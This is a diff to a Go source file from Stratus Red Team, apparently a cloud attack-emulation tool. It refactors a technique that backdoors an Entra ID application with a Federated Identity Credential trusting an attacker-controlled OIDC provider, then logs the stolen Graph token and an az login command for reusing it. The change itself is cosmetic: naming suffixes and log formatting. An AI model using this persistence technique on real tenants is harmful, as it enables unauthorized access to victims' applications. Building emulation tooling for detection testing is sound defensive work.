@@ -33,10 +33,8 @@ const (
 	oidcContainerName = "oidc"
 	oidcSubject       = "stratus-red-team-oidc"
 	oidcAudience      = "api://AzureADTokenExchange"
-	ficName           = "stratus-red-team-oidc-fic"
 	tokenTTL          = 10 * time.Minute
 	ficWaitTime       = 30 * time.Second
-	techniqueID       = "entra-id.persistence.backdoor-application-fic"
 )
 
 type oidcDiscovery struct {
@@ -62,7 +60,7 @@ type jwkSet struct {
 
 func init() {
 	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
-		ID:           techniqueID,
+		ID:           "entra-id.persistence.backdoor-application-fic",
 		FriendlyName: "Backdoor Entra ID application with Federated Identity Credential (FIC)",
 		Description: `
 Backdoors an existing Entra ID application by creating a new Federated Identity Credential (FIC) that trusts an attacker-controlled OIDC provider.
@@ -107,6 +105,7 @@ func detonate(params map[string]string, providers stratus.CloudProviders) error 
 	victimAppId := params["app_id"]
 	storageAccountName := params["storage_account_name"]
 	blobServiceURL := params["blob_service_url"]
+	suffix := params["random_suffix"]
 
 	graphClient := providers.EntraId().GetGraphClient()
 	azureProvider := providers.Azure()
@@ -136,9 +135,9 @@ func detonate(params map[string]string, providers stratus.CloudProviders) error 
 	log.Println("Adding Federated Identity Credential to victim application...")
 	ficIssuer := issuerURL
 	ficSubject := oidcSubject
-	ficDescription := "Federated credential trusting attacker-controlled OIDC provider"
+	ficDescription := fmt.Sprintf("stratus-red-team-oidc-fic-%s", suffix)
 	ficAudiences := []string{oidcAudience}
-	ficNameStr := ficName
+	ficNameStr := fmt.Sprintf("stratus-red-team-oidc-fic-%s", suffix)
 
 	requestBody := graphmodels.NewFederatedIdentityCredential()
 	requestBody.SetName(&ficNameStr)
@@ -173,10 +172,10 @@ func detonate(params map[string]string, providers stratus.CloudProviders) error 
 
 	log.Println("Obtained victim application access token via malicious OIDC FIC backdoor")
 	log.Println("Victim application Microsoft Graph token:")
-	log.Println(victimToken)
+	log.Println("\n" + victimToken)
 
-	log.Println("\nYou can now use this token to access Microsoft Graph API as the victim application:")
-	log.Println("\nWARNING: Using this command in your current CLI session will change your Azure context. You will need to LOG IN AGAIN to clean up this technique.")
+	log.Println("You can now use this token to access Microsoft Graph API as the victim application:")
+	log.Println("WARNING: Using this command in your current CLI session will change your Azure context. You will need to LOG IN AGAIN to clean up this technique.")
 	log.Println("\naz login --service-principal --allow-no-subscriptions --tenant " + tenantId + " --username " + victimAppId + " --federated-token \"" + oidcToken + "\"")
 	return nil
 }
